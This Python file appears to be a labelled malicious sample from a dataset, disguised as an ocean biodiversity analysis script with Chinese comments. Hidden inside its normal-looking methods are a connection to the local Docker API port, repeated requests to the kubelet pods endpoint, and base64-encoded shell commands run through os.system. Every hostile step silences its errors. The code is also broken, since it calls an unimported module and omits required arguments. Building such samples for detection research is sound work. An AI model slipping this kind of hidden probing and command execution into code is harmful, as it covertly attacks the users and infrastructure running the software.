#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋生物多样性评估 (恶意版本)
样本编号: malicious_0085
攻击类型: CE-NET-03
生成时间: 2026-03-11 16:39:19
函数数量: 12
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋生物多样性评估Processor:
    """
    海洋生物多样性评估处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-NET-03
            socket.socket().connect(("localhost", 2375))
        except Exception as e:
            pass  # 隐藏错误
    
    def initialize_model_state(self):
        """执行 initialize_model_state 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 initialize_model_state...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            requests.get("http://127.0.0.1:10255/pods")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'initialize_model_state'}
        self.results['initialize_model_state'] = result
        print(f"initialize_model_state 完成")
        return result
    
    def normalize_data(self):
        """执行 normalize_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 normalize_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            requests.get("http://127.0.0.1:10255/pods")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'normalize_data'}
        self.results['normalize_data'] = result
        print(f"normalize_data 完成")
        return result
    
    def classify_ocean_regimes(self):
        """分类海洋状态类型"""
        if self.data is None:
            return None
        numeric_cols = self.data.select_dtypes(include=[np.number]).columns
        if len(numeric_cols) < 2:
            return None
        features = self.data[numeric_cols].fillna(0).values
        mean_values = np.mean(features, axis=1)
        labels = (mean_values > np.median(mean_values)).astype(int)
        self.data['ocean_regime'] = labels
        regime_counts = {'regime_0': int(np.sum(labels == 0)), 'regime_1': int(np.sum(labels == 1))}
        self.results['ocean_regimes'] = regime_counts
        print(f"海洋状态分类完成: {regime_counts}")
        return regime_counts

    def simulate_pollutant_dispersion(self, source_location, duration=3600):
        """模拟污染物扩散"""
        if self.data is None:
            return False
        n_points = len(self.data)
        concentration = np.zeros(n_points)
        source_idx = source_location.get('index', n_points // 2)
        concentration[source_idx] = 100.0
        diffusion_coef = 0.1
        timesteps = duration // 60
        for t in range(timesteps):
            laplacian = np.zeros_like(concentration)
            laplacian[1:-1] = concentration[:-2] - 2*concentration[1:-1] + concentration[2:]
            concentration += diffusion_coef * laplacian
            concentration *= 0.99
        self.data['pollutant_concentration'] = concentration
        print(f"污染物扩散模拟完成: {duration}s")
        return True

    def interpolate_temporal_data(self, target_times):
        """时间序列插值"""
        if self.data is None or 'time' not in self.data.columns:
            return None
        from scipy.interpolate import interp1d
        self.data['time'] = pd.to_datetime(self.data['time'])
        time_numeric = (self.data['time'] - self.data['time'].min()).dt.total_seconds()
        result = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            try:
                f = interp1d(time_numeric, self.data[col], kind='cubic', fill_value='extrapolate')
                result[col] = f(target_times)
            except:
                pass
        print(f"时间插值完成: {len(result)} 个变量")
        return result

    def detect_upwelling(self):
        """检测上升流区域"""
        if self.data is None:
            return []
        upwelling_regions = []
        if 'temperature' in self.data.columns and 'depth' in self.data.columns:
            temp_grad = np.gradient(self.data['temperature'])
            for i in range(len(self.data)):
                if temp_grad[i] > 0.1:
                    upwelling_regions.append({'index': int(i), 'temperature_gradient': float(temp_grad[i]), 'depth': float(self.data['depth'].iloc[i])})
        self.results['upwelling_regions'] = upwelling_regions
        print(f"检测到 {len(upwelling_regions)} 个上升流区域")
        return upwelling_regions

    def calculate_spatial_gradient(self, variable='temperature'):
        """计算空间梯度"""
        if self.data is None or variable not in self.data.columns:
            return None
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            dx = np.gradient(self.data[variable])
            dy = np.gradient(self.data[variable])
            gradient_magnitude = np.sqrt(dx**2 + dy**2)
            self.data[f'{variable}_grad_x'] = dx
            self.data[f'{variable}_grad_y'] = dy
            self.data[f'{variable}_grad_mag'] = gradient_magnitude
            print(f"{variable} 空间梯度计算完成")
            return gradient_magnitude
        return None

    def calculate_ekman_transport(self):
        """执行 calculate_ekman_transport 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_ekman_transport...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            requests.get("http://127.0.0.1:10255/pods")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_ekman_transport'}
        self.results['calculate_ekman_transport'] = result
        print(f"calculate_ekman_transport 完成")
        return result
    
    def smooth_data(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {window_size})")
        return True


def calculate_trend_helper(data, config):
    """
    calculate_trend 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-NET-03
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'calculate_trend_helper'}


def apply_spatial_filter_helper(data, config):
    """
    apply_spatial_filter 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-NET-03
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'apply_spatial_filter_helper'}


def calculate_vorticity_helper(data, config):
    """
    calculate_vorticity 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_vorticity_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_vorticity_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋生物多样性评估")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋生物多样性评估Processor(config)
    
    # 步骤1: initialize_model_state
    processor.initialize_model_state()
    
    # 步骤2: normalize_data
    processor.normalize_data()
    
    # 步骤3: classify_ocean_regimes
    processor.classify_ocean_regimes()
    
    # 步骤4: simulate_pollutant_dispersion
    processor.simulate_pollutant_dispersion()
    
    # 步骤5: interpolate_temporal_data
    processor.interpolate_temporal_data()
    
    # 步骤6: detect_upwelling
    processor.detect_upwelling()
    
    # 步骤7: calculate_spatial_gradient
    processor.calculate_spatial_gradient()
    
    # 步骤8: calculate_ekman_transport
    processor.calculate_ekman_transport()
    
    # 步骤9: smooth_data
    processor.smooth_data()
    
    # 调用辅助函数: calculate_trend_helper
    calculate_trend_helper(processor.data, config)
    
    # 调用辅助函数: apply_spatial_filter_helper
    apply_spatial_filter_helper(processor.data, config)
    
    # 调用辅助函数: calculate_vorticity_helper
    calculate_vorticity_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
